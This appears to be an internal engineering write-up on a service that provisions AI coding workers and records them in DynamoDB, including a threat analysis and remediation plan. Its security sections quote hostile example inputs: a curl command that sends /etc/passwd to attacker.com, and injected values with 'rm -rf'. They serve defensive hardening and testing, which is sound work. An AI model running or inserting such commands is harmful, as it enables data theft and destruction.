# AGENT-002: Terminal Worker Provisioning — Investigation & Implementation Write-up

> ~5 pages. Read the real code before writing; cite `file:line`. Be concrete, not generic.

## 1. Summary & Classification

AGENT-002 automates the full lifecycle of an AI coding worker: provision a compute instance (EC2 or Kubernetes pod), simulate tool installation (Claude Code CLI or OpenAI Codex CLI), inject the user's LLM API key, verify the tool, and register the worker in DynamoDB. In dev mode the entire provisioning sequence completes synchronously in-memory without touching real AWS; in prod the same code path calls real EC2/K8s launchers. Worker records are the anchor for all downstream agent activity: AGENT-003 (orchestrator), AGENT-004 (fleet UI), AGENT-005 (memory), and AGENT-006 (terminal monitoring) all pivot on `worker_id`.

- **Type**: Feature (infrastructure abstraction + CRUD service)
- **Priority**: High — unblocks all AGENT-003 through AGENT-006
- **Status**: Implemented
- **Owning area**: AI Agents / Infrastructure
- **User persona**: Developer user who wants one-click agent worker creation
- **Cross-references**: [[SEC-021]] (command-injection in startup scripts), [[SECOPS-007]] (dev mock EC2/K8s vs real), [[AGENT-001]] (LLM key vault), [[INFRA-003]] (EC2 launcher), [[INFRA-004]] (K8s launcher)

---

## 2. Current-State Investigation (what exists today)

### 2.1 Service file

`app/services/agent_worker_provisioner.py` (467 lines) is fully present.

**Key functions:**

- `create_worker` (line 157): validates inputs (agent_type, tool, compute_type; confirms LLM key exists via AGENT-001 `get_key`), checks `_count_active_workers ≤ MAX_WORKERS_PER_USER` (default 5, from settings), then calls `launch_instance` or `launch_pod`, writes the `agent_workers` DDB item with `worker_status="provisioning"`, and calls `_provision_worker_dev` synchronously when `S.dev_mode` is true (line 247). In prod the provisioning would run as an async background task.
- `_provision_worker_dev` (line 252): simulates all four provisioning steps (`compute_launch`, `tool_install`, `key_inject`, `verify`) by calling `launch_instance` / `launch_pod` on the mock launchers, appending provision log entries, then setting `worker_status="ready"`. Note: at line 274-275 and 286 it carefully stores the launcher's internal `instance_id` / `pod_id` (not the AWS `ec2_instance_id` / `k8s_pod_name`), because the lifecycle helpers look up by DDB sort key `INSTANCE#{instance_id}` — passing the wrong ID would make stop/terminate raise a not-found error.
- `stop_worker` / `start_worker` / `terminate_worker` (lines 375-444): call the underlying compute lifecycle functions and update DDB status.
- `get_provision_log` (line 446): returns the `provision_log` list from the worker item.
- `check_idle_workers` (line 462): scans for workers where `now() - last_activity_at > idle_timeout_seconds`; stubs exist but the implementation body is minimal (returns 0).

**Tool install scripts** (line 33): `TOOL_INSTALL_SCRIPTS` dict defines `install_commands`, `env_var` (`ANTHROPIC_API_KEY` / `OPENAI_API_KEY`), and `verify_command` for `claude_code`, `codex`, and `custom`. In dev mode these are never actually executed — the provisioner only reads `tool_config` for the tool version string and log message.

**SEC-021 latent risk:** The `CreateWorkerIn` model (`app/models.py:5276`) accepts `custom_install_commands: Optional[List[str]]` and `custom_verify_command: str`. In `create_worker` these are passed to `_provision_worker_dev` but the dev path does not execute them (it uses hardcoded mock steps). If a future prod path executes `custom_install_commands` with `subprocess(shell=True)` or f-string interpolation, any shell metacharacters in the list would achieve arbitrary code execution on the worker host. The mitigation is to either keep these fields permanently inert (remove them or validate they can only reference an allowlist), or always pass them as argv lists with `shell=False`. See SEC-021 for the full remediation plan.

### 2.2 Router

`app/routers/agent_workers.py` (155 lines) exposes 9 endpoints under `/ui/agent/workers` and registers at `app/main.py:724`. All routes use `require_ui_session`; no admin-only endpoints exist here (admin fleet view lives in AGENT-004's router).

The `/ui/agent/workers/tools` endpoint (line 33) returns the static tool list from `TOOL_INSTALL_SCRIPTS`. The `/ui/agent/workers/compute-options` endpoint (line 40) returns a hardcoded list of EC2 and K8s options with vCPU / memory / cost metadata.

### 2.3 Data model

`app/models.py:5276` — `CreateWorkerIn` with fields `label`, `agent_type` (pattern `^(coder|qa|reviewer|devops|custom)$`), `tool`, `compute_type`, `instance_type`, `llm_key_id`, `repo_url`, `branch_convention`, `idle_timeout_seconds` (ge=600, le=86400), `template_id`, `custom_install_commands`, `custom_env_var`, `custom_verify_command`.

`app/models.py:5299` — `WorkerOut` with all worker fields including `provision_log: List[ProvisionStepOut]`.

### 2.4 DynamoDB table

`scripts/local-ddb-init.py:1886` creates `agent_workers`:
- PK `USER#{user_id}`, SK `WORKER#{worker_id}`
- GSIs: `ByStatus` (pk + worker_status), `ByCreatedAt` (pk + created_at, `attr_types={"created_at": "N"}`), `ByAgentType` (pk + agent_type)
- Templates stored as `TEMPLATE#{template_id}` SK in the same table

`app/core/settings.py:2122` adds `agent_workers_table_name`; `app/core/tables.py:261,496` wires `T.agent_workers`.

### 2.5 Frontend

`frontend/src/pages/agents/WorkersPage.tsx` shows the workers list. The creation wizard lives in `AgentDashboard.tsx` and `FleetDashboard.tsx`. Route `/agents/workers` is in `App.tsx`.

### 2.6 E2E tests

`frontend/e2e/agent-workers.spec.ts` covers sections 627-630 (16 tests): tool/compute options API, worker CRUD, lifecycle (stop/start/terminate), and UI wizard.

### 2.7 Dev vs prod parity (SECOPS-007)

| Concern | Dev path | Prod path |
|---|---|---|
| Compute launch | `MockEc2Store` / `MockK8sStore` in ec2_launcher / k8s_launcher | Real `boto3` EC2 / K8s API |
| Provisioning steps | `_provision_worker_dev` — in-process, synchronous | Background task via SSH/cloud-init |
| API key injection | Logged as `key_inject` step, never actually written | Sets env var on remote instance |
| Idle worker check | `check_idle_workers` stub | Same function with real compute stop calls |

The branch is driven entirely by `S.dev_mode`; the prod code path does not exist yet (INFRA-003/004 are not implemented), but the architecture correctly isolates the mock behind the same function signatures.

---

## 3. Gap / Threat Analysis

### 3.1 SEC-021: custom_install_commands injection (latent)

`custom_install_commands` (list of strings) and `custom_verify_command` (string) are accepted in `CreateWorkerIn` and stored in the worker DDB item. If any prod code path passes these to a shell — even something as innocent as `os.system(cmd)` or `subprocess.run(cmd, shell=True)` — a malicious command like `"git clone repo; curl http://attacker.com/$(cat /etc/passwd)"` would execute with the worker's OS privileges.

**Precondition**: Currently dead code in dev. Risk becomes real the moment a prod provisioner runs `custom_install_commands` on a real instance.

**Mitigation**: Per SEC-021, validate each command string against a strict allowlist of permitted verbs and reject shell metacharacters (`; & | > < $ \`` etc.) at input time. Alternatively, restrict `custom_install_commands` to a predetermined set of named steps (e.g., `"install_node20"`, `"install_python312"`) and resolve each to a hardcoded argv list server-side, never executing user-supplied strings.

### 3.2 repo_url injection

`_build_startup_script` (ticket design, not yet in prod) would include:
```python
f"git clone {repo_url} ~/workspace"
```
A `repo_url` of `"; rm -rf ~; echo "` would execute arbitrary commands. Even the `git` `ext::` transport can spawn subprocesses. The fix is `subprocess(["git", "clone", "--", repo_url, "~/workspace"], shell=False)` after validating `repo_url` is `https://` or `git@` and does not contain shell-special chars.

### 3.3 Worker limit check is not atomic

`_count_active_workers` reads the count and then `create_worker` writes — a TOCTOU race means two concurrent requests can both pass the count check and both create workers, briefly exceeding `MAX_WORKERS_PER_USER`. At low concurrency this is unlikely but should be guarded with a DDB conditional write or a per-user lock.

### 3.4 LLM key ownership not re-verified during provisioning

`create_worker` calls `get_key(user_id, llm_key_id)` to verify the key exists. If a key is shared across users (which the current schema doesn't allow), or if `user_id` is manipulated via header injection in dev mode, a worker could launch with a foreign key. Since the schema is `USER#{user_id}` as PK, this is currently safe — but the pattern should be documented.

### 3.5 Idle-worker auto-shutdown not implemented

`check_idle_workers` (line 462) has a stub body (`return 0`). Workers that are left in `"ready"` state indefinitely will accumulate compute costs in prod. The implementation needs to query `ByStatus` GSI for `worker_status="ready"`, filter `last_activity_at < now - idle_timeout_seconds`, and call `stop_worker` for each. This is the second-highest operational risk after command injection.

---

## 4. Proposed Design / Fix

### 4.1 Command-injection remediation (SEC-021)

1. Strip `custom_install_commands` and `custom_verify_command` from `CreateWorkerIn` until a safe exec model is ready; or make them no-op fields permanently.
2. For built-in tools (`claude_code`, `codex`), resolve install steps to hardcoded `argv` lists:
   ```python
   TOOL_INSTALL_ARGV = {
       "claude_code": [
           ["/usr/bin/npm", "install", "-g", "@anthropic-ai/claude-code"],
       ],
       ...
   }
   ```
3. For `repo_url`, validate with `urlparse`: must be `https://` or `git@`, host must not be RFC-1918/link-local, and the path must not contain shell metacharacters before passing to `subprocess` as a list.

### 4.2 Idle-worker shutdown (complete the stub)

```python
def check_idle_workers() -> int:
    threshold = now_ts() - ...  # from worker's idle_timeout_seconds
    # Query ByStatus GSI for worker_status="ready"
    # For each, compare last_activity_at
    # Call stop_worker(user_id, worker_id)
    # Return count stopped
```

Register in `app/main.py` startup as a periodic background task (every 5 minutes), alongside the existing heartbeat checker.

### 4.3 Atomic worker limit check

Use a DDB conditional write on the create operation: before inserting the new worker item, run `update_item` with a `ConditionExpression` that fails if the count of `WORKER#` SK items exceeds the limit. (DDB does not support `COUNT` in conditions, so an alternative is to maintain a `COUNTER#workers` item and use `ADD 1` with `ConditionExpression: counter <= limit`.)

### 4.4 Dev/Prod parity (SECOPS-007)

The current design already satisfies the parity requirement: `_provision_worker_dev` is called only when `S.dev_mode` (line 247). The prod branch would call `_provision_worker_prod` that does SSH/cloud-init. Both branches set the same DDB fields and produce the same `WorkerOut` shape. No scattered `if dev_mode` in business logic — the branch happens once at the top of `create_worker`.

---

## 5. Testing, Verification & Rollout

### 5.1 pytest unit tests

Key cases in `tests/test_agent_worker_provisioner.py`:

| Test | What it pins |
|---|---|
| `test_create_worker_dev_mode_reaches_ready` | Worker starts `"provisioning"`, ends `"ready"` synchronously in dev |
| `test_provision_log_has_four_steps` | `provision_log` contains `compute_launch`, `tool_install`, `key_inject`, `verify` |
| `test_worker_limit_enforced` | 6th create attempt → 409 |
| `test_invalid_llm_key_id_rejected` | Non-existent `llm_key_id` → 400 |
| `test_stop_running_worker` | `worker_status` transitions `ready` → `stopped`, `stopped_at` set |
| `test_cannot_stop_terminated` | Stop on terminated worker → `ValueError` |
| `test_custom_install_commands_not_executed` | If passed, dev provision never calls `subprocess` or `os.system` |
| `test_repo_url_shell_chars_rejected` | `repo_url="git@github.com/foo; rm -rf /"` → 422 |

### 5.2 E2E tests (Playwright)

`frontend/e2e/agent-workers.spec.ts` sections 627-630:
- Section 628.5: poll GET worker until `worker_status === "ready"` (max 10s) — validates async-looking mock provisioning.
- Section 629: stop → start → terminate lifecycle; verify `stopped_at`, `started_at`, `terminated_at` timestamps.
- Section 630.18: wizard "Create Worker" flow end-to-end; new row appears in table with status badge.

### 5.3 Manual QA

```bash
# Create worker
curl -s -X POST http://localhost:8000/ui/agent/workers \
  -H "x-csrf-token: $CSRF" -b "$COOKIES" \
  -d '{"label":"Test","agent_type":"coder","tool":"claude_code","compute_type":"ec2","instance_type":"t3.medium","llm_key_id":"KEY_ID"}'

# Should return worker_status: "ready" (dev mode is synchronous)
# Check provision_log has 4 entries
curl -s http://localhost:8000/ui/agent/workers/$WORKER_ID/provision-log -b "$COOKIES"
```

### 5.4 Observability

Add `logger.warn` in `check_idle_workers` for each worker stopped (include `worker_id`, `user_id`, `idle_seconds`). Add a `worker.provisioning.error` log event in the `except` block of `_provision_worker_dev` (currently only `logger.error` is called).

### 5.5 Rollout

The feature is live in dev. For prod:
1. Gate on `AGENT_WORKERS_ENABLED=true` environment flag.
2. Deploy INFRA-003 (EC2 launcher) before enabling prod provisioning.
3. Start with `compute_type="k8s"` only (faster, cheaper, stateless) before enabling EC2.
4. `check_idle_workers` background task: enable after validating in staging for one sprint.

### 5.6 Rollback

Set `AGENT_WORKERS_ENABLED=false`. Existing worker records in DDB are inert (no compute is actually running in dev). In prod, running workers must be manually terminated via the fleet UI before disabling the flag.

### 5.7 Effort estimate: **S** (2-3 days) for gap fixes (idle shutdown implementation, command injection hardening). Core feature is already implemented.
